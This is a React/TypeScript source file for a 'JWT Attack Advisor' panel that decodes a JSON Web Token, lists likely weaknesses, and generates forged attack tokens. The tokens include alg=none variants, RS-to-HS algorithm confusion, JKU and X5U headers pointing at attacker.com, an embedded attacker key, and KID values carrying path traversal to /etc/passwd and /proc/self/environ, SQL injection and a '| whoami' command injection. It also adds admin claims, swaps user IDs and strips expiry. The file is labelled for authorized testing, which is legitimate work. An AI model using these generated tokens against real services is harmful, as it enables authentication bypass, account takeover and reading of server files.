import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faKey, faExclamationTriangle, faCheckCircle, faSearch, faCopy, faShieldAlt, faBug, faDownload, faEdit, faPlus } from '@fortawesome/free-solid-svg-icons';

export type JwtAttackAdvisorData = {
  token?: string;
  header?: JwtHeader;
  payload?: Record<string, unknown>;
  attacks?: JwtAttack[];
  analyzedAt?: number;
  error?: string;
  generatedTokens?: GeneratedToken[];
  activeTab?: 'analyze' | 'generate';
};

export type JwtHeader = {
  alg?: string;
  typ?: string;
  kid?: string;
  jku?: string;
  x5u?: string;
  x5c?: string[];
  jwk?: Record<string, unknown>;
  [key: string]: unknown;
};

export type JwtAttack = {
  name: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  payload?: string;
  applicable: boolean;
  reason?: string;
  category: 'algorithm' | 'header' | 'signature' | 'claims' | 'key';
};

export type GeneratedToken = {
  name: string;
  token: string;
  description: string;
};

type Props = {
  data: JwtAttackAdvisorData | undefined;
  onChange: (data: JwtAttackAdvisorData) => void;
};

const base64UrlDecode = (str: string): string => {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  const padding = base64.length % 4;
  if (padding) {
    base64 += '='.repeat(4 - padding);
  }
  return atob(base64);
};

const base64UrlEncode = (str: string): string => {
  return btoa(str)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
};

// Generate attack tokens
const generateAttackTokens = (headerB64: string, payloadB64: string, header: JwtHeader): GeneratedToken[] => {
  const tokens: GeneratedToken[] = [];

  try {
    // 1. Algorithm None Attack (multiple variants)
    const noneVariants = ['none', 'None', 'NONE', 'nOnE'];
    for (const alg of noneVariants) {
      const newHeader = { ...header, alg };
      const headerEnc = base64UrlEncode(JSON.stringify(newHeader));
      tokens.push({
        name: `alg=${alg}`,
        token: `${headerEnc}.${payloadB64}.`,
        description: `Algorithm set to "${alg}" with empty signature`
      });
    }

    // 2. Empty signature
    tokens.push({
      name: 'Empty Signature',
      token: `${headerB64}.${payloadB64}.`,
      description: 'Original header with empty signature'
    });

    // 3. Algorithm confusion HS256
    if (header.alg?.startsWith('RS') || header.alg?.startsWith('ES') || header.alg?.startsWith('PS')) {
      const hs256Header = { ...header, alg: 'HS256' };
      const headerEnc = base64UrlEncode(JSON.stringify(hs256Header));
      tokens.push({
        name: 'RS256 → HS256',
        token: `${headerEnc}.${payloadB64}.[sign-with-public-key]`,
        description: 'Algorithm confusion: sign with public key as HMAC secret'
      });

      const hs384Header = { ...header, alg: 'HS384' };
      const headerEnc384 = base64UrlEncode(JSON.stringify(hs384Header));
      tokens.push({
        name: 'RS256 → HS384',
        token: `${headerEnc384}.${payloadB64}.[sign-with-public-key]`,
        description: 'Algorithm confusion variant with HS384'
      });
    }

    // 4. JKU Injection
    const jkuHeader = { ...header, jku: 'https://attacker.com/.well-known/jwks.json' };
    const jkuEnc = base64UrlEncode(JSON.stringify(jkuHeader));
    tokens.push({
      name: 'JKU Injection',
      token: `${jkuEnc}.${payloadB64}.[sign-with-attacker-key]`,
      description: 'JKU header pointing to attacker-controlled JWKS'
    });

    // 5. X5U Injection
    const x5uHeader = { ...header, x5u: 'https://attacker.com/cert.pem' };
    const x5uEnc = base64UrlEncode(JSON.stringify(x5uHeader));
    tokens.push({
      name: 'X5U Injection',
      token: `${x5uEnc}.${payloadB64}.[sign-with-attacker-key]`,
      description: 'X5U header pointing to attacker-controlled X.509 cert'
    });

    // 6. Embedded JWK Attack
    const embeddedJwkHeader = {
      ...header,
      jwk: {
        kty: 'RSA',
        n: 'attacker-public-key-n',
        e: 'AQAB',
        kid: 'attacker-key-1'
      }
    };
    const jwkEnc = base64UrlEncode(JSON.stringify(embeddedJwkHeader));
    tokens.push({
      name: 'Embedded JWK',
      token: `${jwkEnc}.${payloadB64}.[sign-with-embedded-key]`,
      description: 'Embed attacker-controlled JWK in header'
    });

    // 7. KID Path Traversal variants
    if (header.kid) {
      const kidPayloads = [
        { kid: '../../../dev/null', desc: 'Path traversal to /dev/null' },
        { kid: '../../../../../../etc/passwd', desc: 'Path traversal to passwd' },
        { kid: '/dev/null', desc: 'Absolute path to null device' },
        { kid: "'; SELECT 'secret' --", desc: 'SQL injection in KID' },
        { kid: "' OR '1'='1' --", desc: 'SQL injection boolean bypass' },
        { kid: '../../../../../../../../proc/self/environ', desc: 'Read environment variables' }
      ];

      for (const { kid, desc } of kidPayloads) {
        const kidHeader = { ...header, kid };
        const kidEnc = base64UrlEncode(JSON.stringify(kidHeader));
        tokens.push({
          name: `KID: ${kid.substring(0, 20)}...`,
          token: `${kidEnc}.${payloadB64}.`,
          description: desc
        });
      }
    }

    // 8. Claim modifications (decode payload, modify, re-encode)
    const payloadObj = JSON.parse(base64UrlDecode(payloadB64));

    // Admin privilege escalation
    const adminPayload = { ...payloadObj, admin: true, role: 'admin', is_admin: true };
    const adminEnc = base64UrlEncode(JSON.stringify(adminPayload));
    tokens.push({
      name: 'Admin Escalation',
      token: `${headerB64}.${adminEnc}.[original-sig]`,
      description: 'Add admin=true, role=admin claims'
    });

    // User ID manipulation
    if (payloadObj.sub || payloadObj.user_id || payloadObj.uid) {
      const uidPayload = { ...payloadObj, sub: '1', user_id: 1, uid: 1 };
      const uidEnc = base64UrlEncode(JSON.stringify(uidPayload));
      tokens.push({
        name: 'User ID = 1',
        token: `${headerB64}.${uidEnc}.[original-sig]`,
        description: 'Change user ID to 1 (often admin)'
      });
    }

    // Extend expiration
    const futureExp = Math.floor(Date.now() / 1000) + 86400 * 365; // 1 year
    const expPayload = { ...payloadObj, exp: futureExp, iat: Math.floor(Date.now() / 1000) };
    const expEnc = base64UrlEncode(JSON.stringify(expPayload));
    tokens.push({
      name: 'Extended Expiry',
      token: `${headerB64}.${expEnc}.[original-sig]`,
      description: 'Extend token expiry by 1 year'
    });

    // Remove expiry
    const noExpPayload = { ...payloadObj };
    delete noExpPayload.exp;
    delete noExpPayload.nbf;
    const noExpEnc = base64UrlEncode(JSON.stringify(noExpPayload));
    tokens.push({
      name: 'No Expiry',
      token: `${headerB64}.${noExpEnc}.[original-sig]`,
      description: 'Remove exp and nbf claims'
    });

  } catch {
    // Ignore errors in token generation
  }

  return tokens;
};

const analyzeJwt = (token: string): { header: JwtHeader; payload: Record<string, unknown>; attacks: JwtAttack[]; generatedTokens: GeneratedToken[] } => {
  const parts = token.split('.');
  if (parts.length !== 3) {
    throw new Error('Invalid JWT format. Expected 3 parts separated by dots.');
  }

  const header = JSON.parse(base64UrlDecode(parts[0])) as JwtHeader;
  const payload = JSON.parse(base64UrlDecode(parts[1])) as Record<string, unknown>;
  const attacks: JwtAttack[] = [];

  // Algorithm None Attack
  attacks.push({
    name: 'Algorithm None Attack',
    severity: 'critical',
    description: 'Set algorithm to "none" to bypass signature verification',
    applicable: true,
    reason: 'Always worth trying - many implementations are vulnerable',
    category: 'algorithm'
  });

  // Algorithm Confusion (RS256 -> HS256)
  const isAsymmetric = header.alg?.startsWith('RS') || header.alg?.startsWith('ES') || header.alg?.startsWith('PS');
  attacks.push({
    name: 'Algorithm Confusion (RS→HS)',
    severity: 'critical',
    description: 'Change RS256 to HS256 and sign with public key as secret',
    applicable: isAsymmetric ?? false,
    reason: isAsymmetric ? 'Token uses asymmetric algorithm' : 'Token already uses symmetric algorithm',
    category: 'algorithm'
  });

  // JKU/X5U Injection
  attacks.push({
    name: 'JKU Header Injection',
    severity: 'critical',
    description: 'Add jku header pointing to attacker-controlled JWKS',
    applicable: true,
    reason: header.jku ? `Current JKU: ${header.jku}` : 'JKU not present - may accept if added',
    category: 'header'
  });

  attacks.push({
    name: 'X5U Header Injection',
    severity: 'critical',
    description: 'Add x5u header pointing to attacker X.509 certificate',
    applicable: true,
    reason: header.x5u ? `Current X5U: ${header.x5u}` : 'X5U not present - may accept if added',
    category: 'header'
  });

  // Embedded JWK Attack
  attacks.push({
    name: 'Embedded JWK Attack',
    severity: 'critical',
    description: 'Embed attacker-controlled JWK in header',
    applicable: isAsymmetric ?? false,
    reason: header.jwk ? 'Token already has embedded JWK' : 'May accept embedded JWK if added',
    category: 'header'
  });

  // KID Attacks
  attacks.push({
    name: 'KID Path Traversal',
    severity: 'high',
    description: 'KID may be vulnerable to path traversal (e.g., ../../../dev/null)',
    applicable: true,
    reason: header.kid ? `Current KID: ${header.kid}` : 'Can add KID header',
    category: 'header'
  });

  attacks.push({
    name: 'KID SQL Injection',
    severity: 'high',
    description: 'If KID is used in database query, SQL injection may work',
    applicable: true,
    reason: 'KID often looked up in database',
    category: 'header'
  });

  attacks.push({
    name: 'KID Command Injection',
    severity: 'high',
    description: 'KID may be passed to shell command (rare but critical)',
    payload: 'kid: "| whoami"',
    applicable: !!header.kid,
    reason: 'Test if KID is executed',
    category: 'header'
  });

  // Weak Secret
  attacks.push({
    name: 'Weak Secret Brute Force',
    severity: 'high',
    description: 'HMAC-signed tokens may use weak/common secrets',
    applicable: header.alg?.startsWith('HS') ?? false,
    reason: header.alg?.startsWith('HS') ? 'Token uses HMAC' : 'Not using HMAC',
    category: 'key'
  });

  // Signature Attacks
  attacks.push({
    name: 'Signature Stripping',
    severity: 'medium',
    description: 'Remove or truncate signature',
    applicable: true,
    reason: 'Test if signature is properly validated',
    category: 'signature'
  });

  attacks.push({
    name: 'Invalid Signature',
    severity: 'medium',
    description: 'Send token with random/invalid signature',
    applicable: true,
    reason: 'Some implementations skip validation',
    category: 'signature'
  });

  // Expiration Bypass
  const now = Math.floor(Date.now() / 1000);
  const exp = payload.exp as number | undefined;
  const nbf = payload.nbf as number | undefined;

  if (exp && exp < now) {
    attacks.push({
      name: 'Expired Token Replay',
      severity: 'medium',
      description: 'Token is expired - test if expiration is enforced',
      applicable: true,
      reason: `Expired: ${new Date(exp * 1000).toISOString()}`,
      category: 'claims'
    });
  }

  if (nbf && nbf > now) {
    attacks.push({
      name: 'NBF Bypass',
      severity: 'low',
      description: 'Token not yet valid - test if nbf is enforced',
      applicable: true,
      reason: `Valid from: ${new Date(nbf * 1000).toISOString()}`,
      category: 'claims'
    });
  }

  // Claim Manipulation
  attacks.push({
    name: 'Privilege Escalation',
    severity: 'high',
    description: 'Modify role/admin/permissions claims',
    applicable: true,
    reason: 'Test if claim values are validated server-side',
    category: 'claims'
  });

  attacks.push({
    name: 'User ID Manipulation',
    severity: 'high',
    description: 'Change sub/user_id to access other accounts',
    applicable: !!(payload.sub || payload.user_id || payload.uid),
    reason: 'IDOR via JWT claim modification',
    category: 'claims'
  });

  attacks.push({
    name: 'Issuer/Audience Bypass',
    severity: 'medium',
    description: 'Modify iss/aud claims to bypass validation',
    applicable: !!(payload.iss || payload.aud),
    reason: `iss: ${payload.iss || 'none'}, aud: ${payload.aud || 'none'}`,
    category: 'claims'
  });

  // Generate attack tokens
  const generatedTokens = generateAttackTokens(parts[0], parts[1], header);

  return { header, payload, attacks, generatedTokens };
};

const JwtAttackAdvisor: React.FC<Props> = ({ data, onChange }) => {
  const token = data?.token ?? '';
  const header = data?.header;
  const payload = data?.payload;
  const attacks = data?.attacks ?? [];
  const generatedTokens = data?.generatedTokens ?? [];
  const analyzedAt = data?.analyzedAt;
  const error = data?.error ?? '';
  const activeTab = data?.activeTab ?? 'analyze';
  const [copiedItem, setCopiedItem] = useState<string | null>(null);
  const [filterCategory, setFilterCategory] = useState<string>('all');

  const handleAnalyze = () => {
    if (!token.trim()) return;

    try {
      const result = analyzeJwt(token.trim());
      onChange({
        ...data,
        header: result.header,
        payload: result.payload,
        attacks: result.attacks,
        generatedTokens: result.generatedTokens,
        analyzedAt: Date.now(),
        error: ''
      });
    } catch (e) {
      onChange({
        ...data,
        error: e instanceof Error ? e.message : 'Failed to analyze JWT',
        header: undefined,
        payload: undefined,
        attacks: [],
        generatedTokens: []
      });
    }
  };

  const handleCopy = async (text: string, name: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedItem(name);
    setTimeout(() => setCopiedItem(null), 2000);
  };

  const exportAsJson = () => {
    const exportData = {
      originalToken: token,
      analyzedAt: analyzedAt ? new Date(analyzedAt).toISOString() : null,
      header,
      payload,
      attacks: attacks.filter(a => a.applicable),
      generatedTokens
    };
    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `jwt-attack-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const severityColors = {
    critical: 'border-red-500/50 bg-red-900/20 text-red-400',
    high: 'border-orange-500/50 bg-orange-900/20 text-orange-400',
    medium: 'border-yellow-500/50 bg-yellow-900/20 text-yellow-400',
    low: 'border-blue-500/50 bg-blue-900/20 text-blue-400'
  };

  const filteredAttacks = attacks.filter(a =>
    a.applicable && (filterCategory === 'all' || a.category === filterCategory)
  );

  const categories = ['all', 'algorithm', 'header', 'signature', 'claims', 'key'];

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">JWT Attack Advisor</div>
        <div className="flex gap-1">
          {analyzedAt && (
            <button
              onClick={exportAsJson}
              className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors"
              title="Export as JSON"
            >
              <FontAwesomeIcon icon={faDownload} className="w-2.5 h-2.5" />
            </button>
          )}
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Analyzes JWTs and generates attack payloads for security testing.
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <div className="text-[10px] text-slate-500 mb-1">JWT Token</div>
        <textarea
          value={token}
          onChange={(e) => onChange({ ...data, token: e.target.value })}
          placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-purple-500 font-mono h-16 resize-none"
        />
      </div>

      <button
        onClick={handleAnalyze}
        disabled={!token.trim()}
        className="w-full rounded bg-purple-600/20 border border-purple-500/30 px-2 py-1.5 text-[11px] text-purple-300 hover:bg-purple-600/30 transition-colors disabled:opacity-50 flex items-center justify-center gap-2 mb-3"
      >
        <FontAwesomeIcon icon={faSearch} className="w-3 h-3" />
        Analyze & Generate Attacks
      </button>

      {error && (
        <div className="text-red-400 text-[11px] bg-red-900/20 border border-red-500/30 p-2 rounded flex items-center gap-2 mb-3">
          <FontAwesomeIcon icon={faExclamationTriangle} className="w-3 h-3" />
          {error}
        </div>
      )}

      {header && (
        <>
          {/* Tabs */}
          <div className="flex gap-1 mb-3">
            <button
              onClick={() => onChange({ ...data, activeTab: 'analyze' })}
              className={`px-2 py-1 rounded text-[10px] transition-colors ${
                activeTab === 'analyze'
                  ? 'bg-purple-600/30 text-purple-300 border border-purple-500/50'
                  : 'bg-slate-800 text-slate-400 border border-slate-700 hover:border-slate-500'
              }`}
            >
              <FontAwesomeIcon icon={faBug} className="w-2.5 h-2.5 mr-1" />
              Attacks ({filteredAttacks.length})
            </button>
            <button
              onClick={() => onChange({ ...data, activeTab: 'generate' })}
              className={`px-2 py-1 rounded text-[10px] transition-colors ${
                activeTab === 'generate'
                  ? 'bg-purple-600/30 text-purple-300 border border-purple-500/50'
                  : 'bg-slate-800 text-slate-400 border border-slate-700 hover:border-slate-500'
              }`}
            >
              <FontAwesomeIcon icon={faEdit} className="w-2.5 h-2.5 mr-1" />
              Tokens ({generatedTokens.length})
            </button>
          </div>

          {/* Token Info */}
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3 space-y-2">
            <div>
              <div className="flex items-center justify-between mb-1">
                <div className="text-[10px] text-slate-500 flex items-center gap-1">
                  <FontAwesomeIcon icon={faShieldAlt} className="w-2.5 h-2.5" />
                  Header (alg: {header.alg})
                </div>
                <button
                  onClick={() => handleCopy(JSON.stringify(header, null, 2), 'header')}
                  className="text-[9px] text-slate-500 hover:text-slate-300"
                >
                  <FontAwesomeIcon icon={copiedItem === 'header' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
                </button>
              </div>
              <pre className="p-1.5 bg-slate-900/50 rounded text-[9px] font-mono text-green-400 overflow-x-auto max-h-14">
                {JSON.stringify(header, null, 2)}
              </pre>
            </div>

            <div>
              <div className="flex items-center justify-between mb-1">
                <div className="text-[10px] text-slate-500 flex items-center gap-1">
                  <FontAwesomeIcon icon={faKey} className="w-2.5 h-2.5" />
                  Payload
                </div>
                <button
                  onClick={() => handleCopy(JSON.stringify(payload, null, 2), 'payload')}
                  className="text-[9px] text-slate-500 hover:text-slate-300"
                >
                  <FontAwesomeIcon icon={copiedItem === 'payload' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
                </button>
              </div>
              <pre className="p-1.5 bg-slate-900/50 rounded text-[9px] font-mono text-blue-400 overflow-x-auto max-h-14">
                {JSON.stringify(payload, null, 2)}
              </pre>
            </div>
          </div>

          {activeTab === 'analyze' && (
            <>
              {/* Category Filter */}
              <div className="flex gap-1 mb-2 flex-wrap">
                {categories.map(cat => (
                  <button
                    key={cat}
                    onClick={() => setFilterCategory(cat)}
                    className={`px-1.5 py-0.5 rounded text-[8px] transition-colors ${
                      filterCategory === cat
                        ? 'bg-purple-600/30 text-purple-300 border border-purple-500/50'
                        : 'bg-slate-800 text-slate-400 border border-slate-700 hover:border-slate-500'
                    }`}
                  >
                    {cat.charAt(0).toUpperCase() + cat.slice(1)}
                  </button>
                ))}
              </div>

              <div className="flex-1 overflow-y-auto min-h-0">
                <div className="space-y-1.5">
                  {filteredAttacks.map((attack, index) => (
                    <div
                      key={index}
                      className={`p-2 rounded border ${severityColors[attack.severity]}`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="font-medium text-[10px] text-slate-200">{attack.name}</span>
                        <span className={`text-[8px] px-1 py-0.5 rounded ${
                          attack.severity === 'critical' ? 'bg-red-600/50' :
                          attack.severity === 'high' ? 'bg-orange-600/50' :
                          attack.severity === 'medium' ? 'bg-yellow-600/50' : 'bg-blue-600/50'
                        } text-slate-200`}>
                          {attack.severity.toUpperCase()}
                        </span>
                      </div>
                      <div className="text-[9px] text-slate-400">{attack.description}</div>
                      {attack.reason && (
                        <div className="text-[8px] text-slate-500 mt-0.5">{attack.reason}</div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            </>
          )}

          {activeTab === 'generate' && (
            <div className="flex-1 overflow-y-auto min-h-0">
              <div className="space-y-1.5">
                {generatedTokens.map((genToken, index) => (
                  <div
                    key={index}
                    className="p-2 rounded border border-slate-700 bg-slate-800/50"
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="font-medium text-[10px] text-purple-300">{genToken.name}</span>
                      <button
                        onClick={() => handleCopy(genToken.token, genToken.name)}
                        className="text-[9px] text-slate-500 hover:text-slate-300 flex items-center gap-1"
                      >
                        <FontAwesomeIcon icon={copiedItem === genToken.name ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
                      </button>
                    </div>
                    <div className="text-[9px] text-slate-500 mb-1">{genToken.description}</div>
                    <code className="text-[8px] bg-slate-900/50 px-1 rounded text-green-400 block truncate">
                      {genToken.token.substring(0, 60)}...
                    </code>
                  </div>
                ))}
              </div>
            </div>
          )}
        </>
      )}

      <div className="text-[9px] text-slate-600 space-y-0.5 border-t border-slate-700 pt-2 mt-2">
        <div><strong>Attacks:</strong> Algorithm confusion, JKU/X5U injection, KID exploits, claim manipulation</div>
        <div className="text-red-400">For authorized security testing only!</div>
      </div>
    </div>
  );
};

export class JwtAttackAdvisorTool {
  static Component = JwtAttackAdvisor;
}
